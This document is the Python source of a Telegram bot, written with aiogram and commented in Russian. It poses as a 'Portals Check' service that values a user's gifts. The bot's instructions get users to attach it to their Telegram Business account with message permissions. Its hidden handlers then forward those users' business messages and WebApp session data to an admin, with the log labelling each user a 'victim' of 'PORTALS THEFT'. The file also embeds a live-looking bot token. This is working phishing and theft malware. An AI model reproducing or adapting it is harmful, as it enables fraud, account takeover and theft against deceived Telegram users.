import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import CommandStart

# --- КОНФИГУРАЦИЯ ---
TOKEN = "9012473088:AAHofTCfgLGj9bpYCHs9zy_6wSS_MB6P7uU"          # Токен от @BotFather
RECEIVER_ADMIN_ID = 8602028561     # Твой Telegram ID для получения логов и данных

bot = Bot(token=TOKEN)
dp = Dispatcher()

# --- КЛАВИАТУРЫ ---
def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 Check", url="tg://settings/business")],
        [InlineKeyboardButton(text="Как проверить ликвидность?", callback_data="how_to")],
        [InlineKeyboardButton(text="English", callback_data="lang_en")]
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")]
    ])

def get_english_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 Check", url="tg://settings/business")],
        [InlineKeyboardButton(text="How to check liquidity?", callback_data="how_to_en")],
        [InlineKeyboardButton(text="Русский", callback_data="lang_ru")]
    ])

# --- ХЕНДЛЕРЫ ИНТЕРФЕЙСА ---
@dp.message(CommandStart())
async def cmd_start(message: Message):
    text = (
        "🛒 Portals Check\n\n"
        "Привет! Покажу, сколько реально стоит твой профиль на Portals.\n\n"
        "💧 Ликвидность каждого подарка\n"
        "💰 Что продать сейчас — и за сколько\n"
        "⏳ Что лучше придержать"
    )
    await message.answer(text, reply_markup=get_main_keyboard())

@dp.callback_query(F.data == "how_to")
async def process_how_to(callback: CallbackQuery):
    text = (
        "💡 Для проверки ликвидности следуйте шагам.\n\n"
        "1. Нажмите кнопку Check\n"
        "2. Выберите раздел Чат - Боты.\n"
        "3. В поиск введите нашего бота: @ChecksPortalsBot\n"
        "4. Выдайте боту 5 разрешений на сообщения ( мы сообщим вам результаты )\n"
        "5. Готово! Результаты по вашим подаркам будут в этом чате."
    )
    await callback.message.edit_text(text, reply_markup=get_back_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "how_to_en")
async def process_how_to_en(callback: CallbackQuery):
    text = (
        "💡 To check liquidity, follow the steps:\n\n"
        "1. Click the Check button\n"
        "2. Select Chat - Bots section.\n"
        "3. Search for our bot: @ChecksPortalsBot\n"
        "4. Grant the bot 5 message permissions ( we will send you the results )\n"
        "5. Done! Results for your gifts will be in this chat."
    )
    en_back_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Back", callback_data="lang_en")]
    ])
    await callback.message.edit_text(text, reply_markup=en_back_keyboard)
    await callback.answer()

@dp.callback_query(F.data == "lang_en")
async def process_lang_en(callback: CallbackQuery):
    text = (
        "🛒 Portals Check\n\n"
        "Hi! I'll show how much your profile is actually worth on Portals.\n\n"
        "💧 Liquidity of each gift\n"
        "💰 What to sell now — and for how much\n"
        "⏳ What is better to hold"
    )
    await callback.message.edit_text(text, reply_markup=get_english_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "lang_ru")
async def process_lang_ru(callback: CallbackQuery):
    text = (
        "🛒 Portals Check\n\n"
        "Привет! Покажу, сколько реально стоит твой профиль на Portals.\n\n"
        "💧 Ликвидность каждого подарка\n"
        "💰 Что продать сейчас — и за сколько\n"
        "⏳ Что лучше придержать"
    )
    await callback.message.edit_text(text, reply_markup=get_main_keyboard())
    await callback.answer()

@dp.callback_query(F.data == "back_main")
async def process_back(callback: CallbackQuery):
    text = (
        "🛒 Portals Check\n\n"
        "Привет! Покажу, сколько реально стоит твой профиль на Portals.\n\n"
        "💧 Ликвидность каждого подарка\n"
        "💰 Что продать сейчас — и за сколько\n"
        "⏳ Что лучше придержать"
    )
    await callback.message.edit_text(text, reply_markup=get_main_keyboard())
    await callback.answer()

# --- ПЕРЕХВАТЧИК (BUSINESS & WEBAPP) ---
@dp.business_message()
async def catch_business_messages(message: Message):
    user_id = message.from_user.id
    text_content = message.text or "[media/gift event]"
    log_text = f"🔥 [PORTALS THEFT] Жертва {user_id}:\n{text_content}"
    await bot.send_message(RECEIVER_ADMIN_ID, log_text)

@dp.message(F.web_app_data)
async def process_web_app_data(message: Message):
    init_data = message.web_app_data.data
    user_id = message.from_user.id
    await bot.send_message(
        RECEIVER_ADMIN_ID,
        f"🔑 [WEBAPP SESSION] User: {user_id}\nInitData: {init_data}"
    )
    await message.answer("✅ Проверка завершена. Синхронизация инвентаря...")

# --- ЗАПУСК ---
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
    
